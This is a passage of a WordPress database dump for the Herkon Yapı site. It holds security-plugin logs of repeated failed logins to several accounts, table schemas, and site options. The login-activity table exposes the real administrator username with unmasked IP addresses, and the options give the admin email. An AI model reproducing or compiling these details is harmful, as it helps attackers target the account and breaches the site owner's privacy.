INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1070","0","admin","2017-03-15 11:08:53","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1071","0","admin","2017-03-15 11:08:57","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1072","0","admin","2017-03-15 11:17:47","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1073","0","admin","2017-03-15 11:17:52","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1074","0","admin","2017-03-15 11:25:54","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1075","0","admin","2017-03-15 11:25:57","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1076","0","admin","2017-03-15 11:33:50","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1077","0","admin","2017-03-15 11:33:52","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1078","0","admin","2017-03-15 11:45:25","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1079","0","admin","2017-03-15 11:45:27","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1080","0","admin","2017-03-15 11:51:33","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1081","0","admin","2017-03-15 11:51:36","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1082","0","admin","2017-03-15 12:03:55","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1083","0","admin","2017-03-15 12:10:34","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1084","0","admin","2017-03-15 12:10:37","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1085","0","admin","2017-03-15 12:17:16","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1086","0","admin","2017-03-15 12:17:20","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1087","0","admin","2017-03-15 12:22:46","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1088","0","admin","2017-03-15 12:22:48","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1089","0","admin","2017-03-15 12:30:20","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1090","5","demouser","2017-03-15 12:54:30","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1091","5","demouser","2017-03-15 12:54:32","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1092","1","herkon123","2017-03-15 13:07:14","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1093","5","demouser","2017-03-15 13:07:14","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1094","5","demouser","2017-03-15 13:07:16","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1095","1","herkon123","2017-03-15 13:07:16","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1096","5","demouser","2017-03-15 13:31:47","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1097","1","herkon123","2017-03-15 13:31:47","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1098","5","demouser","2017-03-15 13:31:49","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1099","1","herkon123","2017-03-15 13:43:10","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1100","5","demouser","2017-03-15 13:43:11","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1101","1","herkon123","2017-03-15 13:43:12","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1102","1","herkon123","2017-03-15 13:56:18","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1103","5","demouser","2017-03-15 13:56:18","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1104","1","herkon123","2017-03-15 13:56:20","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1105","5","demouser","2017-03-15 13:56:20","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1106","1","herkon123","2017-03-15 14:08:42","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1107","5","demouser","2017-03-15 14:08:43","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1108","5","demouser","2017-03-15 14:33:04","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1109","1","herkon123","2017-03-15 14:33:04","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1110","5","demouser","2017-03-15 14:33:06","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1111","1","herkon123","2017-03-15 14:33:08","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1112","1","herkon123","2017-03-15 14:45:15","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1113","5","demouser","2017-03-15 14:45:17","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1114","5","demouser","2017-03-15 14:45:26","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1115","5","demouser","2017-03-15 14:57:02","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1116","5","demouser","2017-03-15 14:57:17","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1117","5","demouser","2017-03-15 15:09:21","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1118","1","herkon123","2017-03-15 15:09:21","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1119","5","demouser","2017-03-15 15:09:25","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1120","1","herkon123","2017-03-15 15:09:27","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1121","1","herkon123","2017-03-15 15:21:36","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1122","5","demouser","2017-03-15 15:21:36","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1123","1","herkon123","2017-03-15 15:21:39","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1124","5","demouser","2017-03-15 15:21:39","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1125","5","demouser","2017-03-15 15:33:37","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1126","5","demouser","2017-03-15 15:33:40","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1127","5","demouser","2017-03-15 16:00:20","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1128","5","demouser","2017-03-15 16:00:21","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1129","5","demouser","2017-03-15 16:26:07","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1130","1","herkon123","2017-03-15 16:26:07","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1131","5","demouser","2017-03-15 16:26:11","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1132","1","herkon123","2017-03-15 16:26:11","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1133","1","herkon123","2017-03-15 16:38:47","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1134","5","demouser","2017-03-15 16:38:48","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1135","1","herkon123","2017-03-15 16:38:51","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1136","5","demouser","2017-03-15 16:38:52","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1137","5","demouser","2017-03-15 16:51:38","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1138","1","herkon123","2017-03-15 16:51:39","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1139","5","demouser","2017-03-15 16:51:41","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1140","5","demouser","2017-03-15 17:04:17","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1141","1","herkon123","2017-03-15 17:04:17","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1142","5","demouser","2017-03-15 17:04:23","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1143","1","herkon123","2017-03-15 17:04:23","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1144","5","demouser","2017-03-15 17:16:09","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1145","5","demouser","2017-03-15 17:16:16","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1146","5","demouser","2017-03-15 17:28:34","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1147","1","herkon123","2017-03-15 17:28:35","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1148","5","demouser","2017-03-15 17:28:37","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1149","1","herkon123","2017-03-15 17:28:41","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1150","1","herkon123","2017-03-15 17:41:03","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1151","5","demouser","2017-03-15 17:41:04","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1152","5","demouser","2017-03-15 17:41:06","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1153","1","herkon123","2017-03-15 17:41:06","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1154","5","demouser","2017-03-15 18:05:29","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1155","1","herkon123","2017-03-15 18:05:30","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1156","5","demouser","2017-03-15 18:05:37","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1157","1","herkon123","2017-03-15 18:05:42","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1158","1","herkon123","2017-03-15 18:17:58","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1159","5","demouser","2017-03-15 18:18:00","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1160","1","herkon123","2017-03-15 18:18:06","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1161","5","demouser","2017-03-15 18:18:08","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1162","1","herkon123","2017-03-15 18:29:49","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1163","5","demouser","2017-03-15 18:29:49","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1164","5","demouser","2017-03-15 18:29:51","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1165","1","herkon123","2017-03-15 18:29:51","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1166","5","demouser","2017-03-15 18:41:53","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1167","1","herkon123","2017-03-15 18:41:54","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1168","5","demouser","2017-03-15 18:41:55","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1169","1","herkon123","2017-03-15 18:41:56","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1170","1","herkon123","2017-03-15 18:54:29","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1171","1","herkon123","2017-03-15 18:54:31","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1172","1","herkon123","2017-03-15 19:06:06","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1173","5","demouser","2017-03-15 19:06:06","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1174","5","demouser","2017-03-15 19:06:08","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1175","1","herkon123","2017-03-15 19:06:08","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1176","5","demouser","2017-03-15 19:19:00","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1177","1","herkon123","2017-03-15 19:19:00","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1178","1","herkon123","2017-03-15 19:19:01","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1179","5","demouser","2017-03-15 19:19:02","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1180","5","demouser","2017-03-15 19:34:46","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1181","1","herkon123","2017-03-15 19:34:46","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1182","5","demouser","2017-03-15 19:34:49","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1183","1","herkon123","2017-03-15 19:34:49","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1184","1","herkon123","2017-03-15 19:50:50","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1185","5","demouser","2017-03-15 19:50:51","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1186","1","herkon123","2017-03-15 19:50:52","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1187","5","demouser","2017-03-15 19:50:53","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1188","0","admin","2017-03-16 02:24:01","185.85.239.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1189","0","admin","2017-03-17 08:10:19","211.192.191.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1190","0","pedro615143","2017-03-19 06:17:31","62.219.115.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1191","5","demouser","2017-03-22 07:33:10","112.199.74.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1192","5","demouser","2017-03-22 07:33:13","112.199.74.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1193","5","demouser","2017-03-22 07:33:14","112.199.74.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1194","5","demouser","2017-03-22 07:33:17","112.199.74.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1195","5","demouser","2017-03-22 07:33:19","112.199.74.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1196","5","demouser","2017-03-22 07:33:30","112.199.74.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1197","5","demouser","2017-03-22 07:33:32","112.199.74.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1198","5","demouser","2017-03-22 07:33:34","112.199.74.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1199","5","demouser","2017-03-22 07:33:37","112.199.74.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1200","5","demouser","2017-03-22 07:33:39","112.199.74.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1201","5","demouser","2017-03-22 07:33:42","112.199.74.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1202","5","demouser","2017-03-22 07:33:46","112.199.74.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1203","5","demouser","2017-03-22 07:33:48","112.199.74.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1204","5","demouser","2017-03-22 07:33:50","112.199.74.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1205","5","demouser","2017-03-22 07:33:53","112.199.74.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1206","5","demouser","2017-03-22 07:34:03","112.199.74.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1207","5","demouser","2017-03-22 07:34:06","112.199.74.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1208","5","demouser","2017-03-22 07:34:10","112.199.74.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1209","5","demouser","2017-03-22 07:34:24","112.199.74.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1210","5","demouser","2017-03-22 07:34:26","112.199.74.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1211","5","demouser","2017-03-22 07:34:29","112.199.74.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1212","5","demouser","2017-03-22 07:34:33","112.199.74.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1213","5","demouser","2017-03-22 07:34:36","112.199.74.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1214","5","demouser","2017-03-22 07:34:38","112.199.74.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1215","5","demouser","2017-03-22 07:34:51","112.199.74.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1216","5","demouser","2017-03-22 07:34:53","112.199.74.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1217","5","demouser","2017-03-22 07:34:55","112.199.74.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1218","5","demouser","2017-03-22 07:35:03","112.199.74.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1219","5","demouser","2017-03-22 07:35:06","112.199.74.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1220","5","demouser","2017-03-22 07:35:08","112.199.74.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1221","5","demouser","2017-03-22 07:35:10","112.199.74.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1222","5","demouser","2017-03-22 07:35:12","112.199.74.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1223","5","demouser","2017-03-22 07:35:15","112.199.74.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1224","5","demouser","2017-03-22 07:35:17","112.199.74.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1225","5","demouser","2017-03-22 07:35:18","112.199.74.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1226","5","demouser","2017-03-22 07:35:20","112.199.74.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1227","5","demouser","2017-03-22 07:35:23","112.199.74.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1228","1","herkon123","2017-03-22 22:07:14","131.153.27.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1229","1","herkon123","2017-03-22 22:19:14","74.220.215.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1230","1","herkon123","2017-03-22 22:31:10","213.251.182.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1231","1","herkon123","2017-03-22 22:43:11","91.201.63.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1232","1","herkon123","2017-03-22 22:54:11","37.46.74.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1233","1","herkon123","2017-03-23 00:27:27","37.191.99.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1234","1","herkon123","2017-03-23 00:39:10","188.165.227.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1235","1","herkon123","2017-03-23 13:54:26","5.39.219.*");


DROP TABLE IF EXISTS `cmrfu_aiowps_global_meta`;

CREATE TABLE `cmrfu_aiowps_global_meta` (
  `meta_id` bigint(20) NOT NULL AUTO_INCREMENT,
  `date_time` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `meta_key1` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `meta_key2` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `meta_key3` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `meta_key4` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `meta_key5` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `meta_value1` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `meta_value2` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `meta_value3` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `meta_value4` longtext COLLATE utf8mb4_unicode_ci NOT NULL,
  `meta_value5` longtext COLLATE utf8mb4_unicode_ci NOT NULL,
  PRIMARY KEY (`meta_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;



DROP TABLE IF EXISTS `cmrfu_aiowps_login_activity`;

CREATE TABLE `cmrfu_aiowps_login_activity` (
  `id` bigint(20) NOT NULL AUTO_INCREMENT,
  `user_id` bigint(20) NOT NULL,
  `user_login` varchar(150) COLLATE utf8mb4_unicode_ci NOT NULL,
  `login_date` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `logout_date` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `login_ip` varchar(100) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `login_country` varchar(150) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `browser_type` varchar(150) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=7 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

INSERT INTO `cmrfu_aiowps_login_activity` VALUES("1","1","herkon123","2016-11-16 22:53:44","0000-00-00 00:00:00","176.232.0.63","","");
INSERT INTO `cmrfu_aiowps_login_activity` VALUES("2","1","herkon123","2016-11-17 00:10:51","0000-00-00 00:00:00","176.232.0.63","","");
INSERT INTO `cmrfu_aiowps_login_activity` VALUES("3","1","herkon123","2017-02-04 15:08:02","0000-00-00 00:00:00","78.135.9.22","","");
INSERT INTO `cmrfu_aiowps_login_activity` VALUES("4","1","herkon123","2017-03-02 15:28:59","0000-00-00 00:00:00","95.164.1.157","","");
INSERT INTO `cmrfu_aiowps_login_activity` VALUES("5","1","herkon123","2017-03-10 10:20:24","0000-00-00 00:00:00","95.164.1.157","","");
INSERT INTO `cmrfu_aiowps_login_activity` VALUES("6","1","herkon123","2017-03-22 11:48:07","0000-00-00 00:00:00","91.239.81.62","","");


DROP TABLE IF EXISTS `cmrfu_aiowps_login_lockdown`;

CREATE TABLE `cmrfu_aiowps_login_lockdown` (
  `id` bigint(20) NOT NULL AUTO_INCREMENT,
  `user_id` bigint(20) NOT NULL,
  `user_login` varchar(150) COLLATE utf8mb4_unicode_ci NOT NULL,
  `lockdown_date` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `release_date` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `failed_login_ip` varchar(100) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `lock_reason` varchar(128) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `unlock_key` varchar(128) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;



DROP TABLE IF EXISTS `cmrfu_aiowps_permanent_block`;

CREATE TABLE `cmrfu_aiowps_permanent_block` (
  `id` bigint(20) NOT NULL AUTO_INCREMENT,
  `blocked_ip` varchar(100) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `block_reason` varchar(128) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `country_origin` varchar(50) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `blocked_date` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;



DROP TABLE IF EXISTS `cmrfu_commentmeta`;

CREATE TABLE `cmrfu_commentmeta` (
  `meta_id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `comment_id` bigint(20) unsigned NOT NULL DEFAULT '0',
  `meta_key` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `meta_value` longtext COLLATE utf8mb4_unicode_ci,
  PRIMARY KEY (`meta_id`),
  KEY `comment_id` (`comment_id`),
  KEY `meta_key` (`meta_key`(191))
) ENGINE=MyISAM AUTO_INCREMENT=15 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;



DROP TABLE IF EXISTS `cmrfu_comments`;

CREATE TABLE `cmrfu_comments` (
  `comment_ID` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `comment_post_ID` bigint(20) unsigned NOT NULL DEFAULT '0',
  `comment_author` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `comment_author_email` varchar(100) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `comment_author_url` varchar(200) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `comment_author_IP` varchar(100) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `comment_date` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `comment_date_gmt` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `comment_content` mediumtext COLLATE utf8mb4_unicode_ci NOT NULL,
  `comment_karma` int(11) NOT NULL DEFAULT '0',
  `comment_approved` varchar(20) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '1',
  `comment_agent` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `comment_type` varchar(20) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `comment_parent` bigint(20) unsigned NOT NULL DEFAULT '0',
  `user_id` bigint(20) unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`comment_ID`),
  KEY `comment_post_ID` (`comment_post_ID`),
  KEY `comment_approved_date_gmt` (`comment_approved`,`comment_date_gmt`),
  KEY `comment_date_gmt` (`comment_date_gmt`),
  KEY `comment_parent` (`comment_parent`),
  KEY `comment_author_email` (`comment_author_email`(10))
) ENGINE=MyISAM AUTO_INCREMENT=12 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;



DROP TABLE IF EXISTS `cmrfu_links`;

CREATE TABLE `cmrfu_links` (
  `link_id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `link_url` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `link_name` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `link_image` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `link_target` varchar(25) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `link_description` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `link_visible` varchar(20) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT 'Y',
  `link_owner` bigint(20) unsigned NOT NULL DEFAULT '1',
  `link_rating` int(11) NOT NULL DEFAULT '0',
  `link_updated` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `link_rel` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `link_notes` longtext COLLATE utf8mb4_unicode_ci NOT NULL,
  `link_rss` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  PRIMARY KEY (`link_id`),
  KEY `link_visible` (`link_visible`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;



DROP TABLE IF EXISTS `cmrfu_options`;

CREATE TABLE `cmrfu_options` (
  `option_id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `option_name` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `option_value` longtext COLLATE utf8mb4_unicode_ci NOT NULL,
  `autoload` varchar(20) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT 'yes',
  PRIMARY KEY (`option_id`),
  UNIQUE KEY `option_name` (`option_name`)
) ENGINE=MyISAM AUTO_INCREMENT=21139 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

INSERT INTO `cmrfu_options` VALUES("1","siteurl","https://www.herkonyapi.com","yes");
INSERT INTO `cmrfu_options` VALUES("2","blogname","Herkon Yapı","yes");
INSERT INTO `cmrfu_options` VALUES("3","blogdescription","Herkese Konut","yes");
INSERT INTO `cmrfu_options` VALUES("4","users_can_register","0","yes");
INSERT INTO `cmrfu_options` VALUES("5","admin_email","info@herkonyapi.com","yes");
INSERT INTO `cmrfu_options` VALUES("6","start_of_week","1","yes");
INSERT INTO `cmrfu_options` VALUES("7","use_balanceTags","0","yes");
INSERT INTO `cmrfu_options` VALUES("8","use_smilies","1","yes");
INSERT INTO `cmrfu_options` VALUES("9","require_name_email","1","yes");
INSERT INTO `cmrfu_options` VALUES("10","comments_notify","1","yes");
INSERT INTO `cmrfu_options` VALUES("11","posts_per_rss","10","yes");
